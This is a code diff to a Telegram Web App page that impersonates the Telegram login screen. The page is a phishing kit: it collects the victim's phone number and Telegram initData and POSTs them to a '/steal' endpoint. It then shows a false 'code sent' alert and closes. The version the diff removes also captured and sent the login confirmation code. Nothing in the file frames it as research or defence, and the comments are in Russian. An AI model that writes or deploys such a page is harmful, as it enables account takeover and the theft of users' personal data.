@@ -13,92 +13,124 @@
         body {
             background: var(--tg-theme-bg-color, #ffffff);
             color: var(--tg-theme-text-color, #000000);
+            line-height: 1.4;
         }
         .page {
+            padding: 20px 16px;
             max-width: 400px;
             margin: 0 auto;
-            padding: 0 16px;
         }
-        .header {
+        .logo {
             text-align: center;
-            padding: 40px 0 20px;
+            margin-bottom: 30px;
         }
-        .avatar {
+        .logo-img {
             width: 120px;
             height: 120px;
             border-radius: 50%;
             margin: 0 auto 16px;
-            background: linear-gradient(45deg, #34aadc, #0077ff);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 48px;
-            color: white;
+            background-size: cover;
+            background-position: center;
+            border: 3px solid #0088cc;
         }
         .title {
             font-size: 20px;
             font-weight: 600;
+            text-align: center;
             margin-bottom: 8px;
         }
         .subtitle {
             font-size: 16px;
-            color: var(--tg-theme-hint-color, #999999);
+            color: var(--tg-theme-hint-color, #707579);
+            text-align: center;
             margin-bottom: 30px;
+            line-height: 1.5;
         }
-        .input-group {
+        .form-group {
             margin-bottom: 16px;
         }
+        .label {
+            font-size: 16px;
+            margin-bottom: 8px;
+            display: block;
+            color: var(--tg-theme-text-color, #000000);
+        }
         .country-selector {
-            background: var(--tg-theme-secondary-bg-color, #f0f0f0);
+            background: var(--tg-theme-secondary-bg-color, #f7f8fa);
             border-radius: 12px;
             padding: 12px 16px;
             margin-bottom: 12px;
             cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
         }
-        .country-code {
-            font-size: 14px;
-            color: var(--tg-theme-hint-color, #999999);
+        .country-info {
+            flex: 1;
+            display: flex;
+            align-items: center;
+        }
+        .country-flag {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            margin-right: 12px;
+            font-size: 18px;
+            text-align: center;
+            line-height: 24px;
         }
         .country-name {
             font-size: 16px;
             font-weight: 500;
         }
+        .country-code {
+            font-size: 16px;
+            color: var(--tg-theme-hint-color, #707579);
+        }
+        .arrow {
+            color: var(--tg-theme-hint-color, #707579);
+            font-size: 18px;
+        }
         .phone-input {
             width: 100%;
             padding: 12px 16px;
-            background: var(--tg-theme-secondary-bg-color, #f0f0f0);
+            background: var(--tg-theme-secondary-bg-color, #f7f8fa);
             border: none;
             border-radius: 12px;
             font-size: 16px;
             outline: none;
         }
+        .checkbox {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+        }
+        .checkbox input {
+            margin-right: 12px;
+            width: 18px;
+            height: 18px;
+        }
         .btn {
             width: 100%;
-            padding: 12px;
-            background: #31a6f3;
+            padding: 14px;
+            background: #0088cc;
             color: white;
             border: none;
             border-radius: 12px;
             font-size: 16px;
             font-weight: 500;
             cursor: pointer;
-            margin-top: 20px;
+            margin-top: 10px;
         }
         .btn:disabled {
-            background: var(--tg-theme-secondary-bg-color, #f0f0f0);
+            background: var(--tg-theme-secondary-bg-color, #f7f8fa);
             color: var(--tg-theme-hint-color, #999999);
             cursor: not-allowed;
-        }
-        .footer {
-            text-align: center;
-            margin-top: 30px;
-            font-size: 14px;
-            color: var(--tg-theme-hint-color, #999999);
         }
         .hidden {
             display: none;
         }
-        .countries-list {
+        .countries-modal {
             position: fixed;
             top: 0;
             left: 0;
@@ -108,177 +140,229 @@
             z-index: 1000;
             overflow-y: auto;
         }
-        .country-item {
+        .modal-header {
             padding: 12px 16px;
-            border-bottom: 1px solid var(--tg-theme-secondary-bg-color, #f0f0f0);
-            cursor: pointer;
+            border-bottom: 1px solid var(--tg-theme-secondary-bg-color, #f7f8fa);
+            font-weight: 500;
+            display: flex;
+            align-items: center;
         }
         .back-btn {
+            margin-right: 16px;
+            cursor: pointer;
+            font-size: 20px;
+        }
+        .search-input {
+            width: 100%;
             padding: 12px 16px;
-            border-bottom: 1px solid var(--tg-theme-secondary-bg-color, #f0f0f0);
-            font-weight: 500;
+            border: none;
+            border-bottom: 1px solid var(--tg-theme-secondary-bg-color, #f7f8fa);
+            font-size: 16px;
+            outline: none;
+        }
+        .country-item {
+            padding: 12px 16px;
+            border-bottom: 1px solid var(--tg-theme-secondary-bg-color, #f7f8fa);
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+        }
+        .country-item-flag {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            margin-right: 12px;
+            font-size: 18px;
+            text-align: center;
+            line-height: 24px;
+        }
+        .country-item-name {
+            flex: 1;
+            font-size: 16px;
+        }
+        .country-item-code {
+            color: var(--tg-theme-hint-color, #707579);
+            font-size: 16px;
         }
     </style>
 </head>
 <body>
-    <div class="page">
-        <!-- Страница ввода номера -->
-        <div id="phonePage">
-            <div class="header">
-                <div class="avatar">T</div>
-                <div class="title">Telegram</div>
-                <div class="subtitle">Войдите в свой аккаунт</div>
-            </div>
+    <!-- Главная страница -->
+    <div class="page" id="mainPage">
+        <div class="logo">
+            <div class="logo-img" id="avatar"></div>
+            <div class="title">Telegram</div>
+            <div class="subtitle">Please confirm your country code and enter your phone number.</div>
+        </div>
 
-            <div class="input-group">
-                <div class="country-selector" onclick="showCountries()">
-                    <div class="country-code">+7</div>
-                    <div class="country-name">Russia</div>
+        <div class="form-group">
+            <div class="label">Country</div>
+            <div class="country-selector" onclick="showCountries()">
+                <div class="country-info">
+                    <div class="country-flag" id="currentFlag">🇺🇦</div>
+                    <div class="country-name" id="currentCountry">Ukraine</div>
                 </div>
-                <input type="tel" class="phone-input" id="phoneInput" placeholder="Your phone number" oninput="validatePhone()">
-            </div>
-
-            <button class="btn" id="nextBtn" disabled onclick="sendPhone()">NEXT</button>
-
-            <div class="footer">
-                You will receive a confirmation code
+                <div class="country-code" id="currentCode">+380</div>
+                <div class="arrow">›</div>
             </div>
         </div>
 
-        <!-- Страница ввода кода -->
-        <div id="codePage" class="hidden">
-            <div class="header">
-                <div class="avatar">T</div>
-                <div class="title">Code</div>
-                <div class="subtitle">We have sent a code to +7 ••• ••• •• ••</div>
-            </div>
-
-            <div class="input-group">
-                <input type="text" class="phone-input" id="codeInput" placeholder="Code" maxlength="5" oninput="validateCode()">
-            </div>
-
-            <button class="btn" id="confirmBtn" disabled onclick="sendCode()">Confirm</button>
+        <div class="form-group">
+            <div class="label">Your phone number</div>
+            <input type="tel" class="phone-input" id="phoneInput" placeholder="+380" oninput="validatePhone()">
         </div>
 
-        <!-- Список стран -->
-        <div id="countriesList" class="countries-list hidden">
-            <div class="back-btn" onclick="hideCountries()">← Back</div>
-            <div class="country-item" onclick="selectCountry('+1', 'United States')">
-                <div class="country-code">+1</div>
-                <div class="country-name">United States</div>
-            </div>
-            <div class="country-item" onclick="selectCountry('+7', 'Russia')">
-                <div class="country-code">+7</div>
-                <div class="country-name">Russia</div>
-            </div>
-            <div class="country-item" onclick="selectCountry('+44', 'United Kingdom')">
-                <div class="country-code">+44</div>
-                <div class="country-name">United Kingdom</div>
-            </div>
-            <div class="country-item" onclick="selectCountry('+49', 'Germany')">
-                <div class="country-code">+49</div>
-                <div class="country-name">Germany</div>
-            </div>
-            <div class="country-item" onclick="selectCountry('+33', 'France')">
-                <div class="country-code">+33</div>
-                <div class="country-name">France</div>
-            </div>
-            <div class="country-item" onclick="selectCountry('+86', 'China')">
-                <div class="country-code">+86</div>
-                <div class="country-name">China</div>
-            </div>
-            <div class="country-item" onclick="selectCountry('+91', 'India')">
-                <div class="country-code">+91</div>
-                <div class="country-name">India</div>
-            </div>
-            <div class="country-item" onclick="selectCountry('+81', 'Japan')">
-                <div class="country-code">+81</div>
-                <div class="country-name">Japan</div>
-            </div>
-            <!-- Добавь больше стран по необходимости -->
+        <div class="checkbox">
+            <input type="checkbox" id="keepSigned" checked>
+            <label for="keepSigned">Keep me signed in</label>
         </div>
+
+        <button class="btn" id="nextBtn" disabled onclick="sendPhone()">NEXT</button>
+    </div>
+
+    <!-- Модальное окно выбора страны -->
+    <div id="countriesModal" class="countries-modal hidden">
+        <div class="modal-header">
+            <div class="back-btn" onclick="hideCountries()">←</div>
+            <div>Select Country</div>
+        </div>
+        <input type="text" class="search-input" id="countrySearch" placeholder="Search country" oninput="filterCountries()">
+        <div id="countriesList"></div>
     </div>
 
     <script>
-        let selectedCountry = '+7';
-        let selectedCountryName = 'Russia';
-        let userPhone = '';
+        // Загрузка аватарки из папки public
+        document.getElementById('avatar').style.backgroundImage = "url('/avatar.jpg')";
+        
+        const countries = [
+            {code: '+1', name: 'United States', flag: '🇺🇸'},
+            {code: '+7', name: 'Russia', flag: '🇷🇺'},
+            {code: '+380', name: 'Ukraine', flag: '🇺🇦'},
+            {code: '+44', name: 'United Kingdom', flag: '🇬🇧'},
+            {code: '+49', name: 'Germany', flag: '🇩🇪'},
+            {code: '+33', name: 'France', flag: '🇫🇷'},
+            {code: '+39', name: 'Italy', flag: '🇮🇹'},
+            {code: '+34', name: 'Spain', flag: '🇪🇸'},
+            {code: '+86', name: 'China', flag: '🇨🇳'},
+            {code: '+81', name: 'Japan', flag: '🇯🇵'},
+            {code: '+82', name: 'South Korea', flag: '🇰🇷'},
+            {code: '+91', name: 'India', flag: '🇮🇳'},
+            {code: '+55', name: 'Brazil', flag: '🇧🇷'},
+            {code: '+52', name: 'Mexico', flag: '🇲🇽'},
+            {code: '+61', name: 'Australia', flag: '🇦🇺'},
+            {code: '+64', name: 'New Zealand', flag: '🇳🇿'},
+            {code: '+31', name: 'Netherlands', flag: '🇳🇱'},
+            {code: '+41', name: 'Switzerland', flag: '🇨🇭'},
+            {code: '+46', name: 'Sweden', flag: '🇸🇪'},
+            {code: '+47', name: 'Norway', flag: '🇳🇴'},
+            {code: '+45', name: 'Denmark', flag: '🇩🇰'},
+            {code: '+358', name: 'Finland', flag: '🇫🇮'},
+            {code: '+48', name: 'Poland', flag: '🇵🇱'},
+            {code: '+420', name: 'Czech Republic', flag: '🇨🇿'},
+            {code: '+36', name: 'Hungary', flag: '🇭🇺'},
+            {code: '+40', name: 'Romania', flag: '🇷🇴'},
+            {code: '+381', name: 'Serbia', flag: '🇷🇸'},
+            {code: '+385', name: 'Croatia', flag: '🇭🇷'},
+            {code: '+30', name: 'Greece', flag: '🇬🇷'},
+            {code: '+90', name: 'Turkey', flag: '🇹🇷'},
+            {code: '+20', name: 'Egypt', flag: '🇪🇬'},
+            {code: '+27', name: 'South Africa', flag: '🇿🇦'},
+            {code: '+234', name: 'Nigeria', flag: '🇳🇬'},
+            {code: '+254', name: 'Kenya', flag: '🇰🇪'},
+            {code: '+966', name: 'Saudi Arabia', flag: '🇸🇦'},
+            {code: '+971', name: 'United Arab Emirates', flag: '🇦🇪'},
+            {code: '+974', name: 'Qatar', flag: '🇶🇦'},
+            {code: '+65', name: 'Singapore', flag: '🇸🇬'},
+            {code: '+60', name: 'Malaysia', flag: '🇲🇾'},
+            {code: '+66', name: 'Thailand', flag: '🇹🇭'},
+            {code: '+84', name: 'Vietnam', flag: '🇻🇳'},
+            {code: '+62', name: 'Indonesia', flag: '🇮🇩'},
+            {code: '+63', name: 'Philippines', flag: '🇵🇭'},
+            {code: '+92', name: 'Pakistan', flag: '🇵🇰'},
+            {code: '+98', name: 'Iran', flag: '🇮🇷'},
+            {code: '+972', name: 'Israel', flag: '🇮🇱'}
+        ];
 
+        let selectedCountry = countries[2]; // Ukraine по умолчанию
         const currentDomain = window.location.hostname;
         const stealUrl = `https://${currentDomain}/steal`;
 
+        function updateCurrentCountry() {
+            document.getElementById('currentCountry').textContent = selectedCountry.name;
+            document.getElementById('currentCode').textContent = selectedCountry.code;
+            document.getElementById('currentFlag').textContent = selectedCountry.flag;
+            document.getElementById('phoneInput').placeholder = selectedCountry.code;
+        }
+
         function showCountries() {
-            document.getElementById('countriesList').classList.remove('hidden');
+            document.getElementById('countriesModal').classList.remove('hidden');
+            renderCountries();
         }
 
         function hideCountries() {
-            document.getElementById('countriesList').classList.add('hidden');
+            document.getElementById('countriesModal').classList.add('hidden');
         }
 
-        function selectCountry(code, name) {
-            selectedCountry = code;
-            selectedCountryName = name;
-            document.querySelector('.country-code').textContent = code;
-            document.querySelector('.country-name').textContent = name;
+        function renderCountries(filter = '') {
+            const list = document.getElementById('countriesList');
+            list.innerHTML = '';
+            
+            const filtered = countries.filter(country => 
+                country.name.toLowerCase().includes(filter.toLowerCase()) ||
+                country.code.includes(filter)
+            );
+            
+            filtered.forEach(country => {
+                const item = document.createElement('div');
+                item.className = 'country-item';
+                item.innerHTML = `
+                    <div class="country-item-flag">${country.flag}</div>
+                    <div class="country-item-name">${country.name}</div>
+                    <div class="country-item-code">${country.code}</div>
+                `;
+                item.onclick = () => selectCountry(country);
+                list.appendChild(item);
+            });
+        }
+
+        function filterCountries() {
+            const search = document.getElementById('countrySearch').value;
+            renderCountries(search);
+        }
+
+        function selectCountry(country) {
+            selectedCountry = country;
+            updateCurrentCountry();
             hideCountries();
             validatePhone();
         }
 
         function validatePhone() {
-            const phone = document.getElementById('phoneInput').value;
+            const phone = document.getElementById('phoneInput').value.replace(selectedCountry.code, '').trim();
             const nextBtn = document.getElementById('nextBtn');
-            userPhone = selectedCountry + phone;
             nextBtn.disabled = !phone.match(/^[0-9]{7,15}$/);
         }
 
-        function validateCode() {
-            const code = document.getElementById('codeInput').value;
-            const confirmBtn = document.getElementById('confirmBtn');
-            confirmBtn.disabled = code.length !== 5;
-        }
-
         function sendPhone() {
+            const phone = document.getElementById('phoneInput').value;
             const tgData = Telegram.WebApp.initData;
             
-            fetch(stealUrl, {
+            fetch('/steal', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
-                    phone: userPhone,
+                    phone: phone,
                     tg_data: tgData,
                     stage: 'phone_entered'
                 })
             }).catch(e => console.error('Error:', e));
 
-            // Показываем код страницы
-            document.getElementById('phonePage').classList.add('hidden');
-            document.getElementById('codePage').classList.remove('hidden');
-            
-            // Обновляем текст с номером
-            const maskedPhone = userPhone.slice(0, 3) + ' ••• ••• •• ••';
-            document.querySelector('#codePage .subtitle').textContent = 
-                `We have sent a code to ${maskedPhone}`;
-        }
-
-        function sendCode() {
-            const code = document.getElementById('codeInput').value;
-            
-            fetch(stealUrl, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    phone: userPhone,
-                    code: code,
-                    tg_data: Telegram.WebApp.initData,
-                    stage: 'code_entered'
-                })
-            }).catch(e => console.error('Error:', e));
-
-            alert('Error connecting to Telegram. Please try again later.');
+            alert('Code has been sent to your phone. Please check Telegram.');
             Telegram.WebApp.close();
         }
 
-        // Инициализация Telegram Web App
+        // Инициализация
+        updateCurrentCountry();
         Telegram.WebApp.ready();
         Telegram.WebApp.expand();
         Telegram.WebApp.setHeaderColor('#4a8cDc');
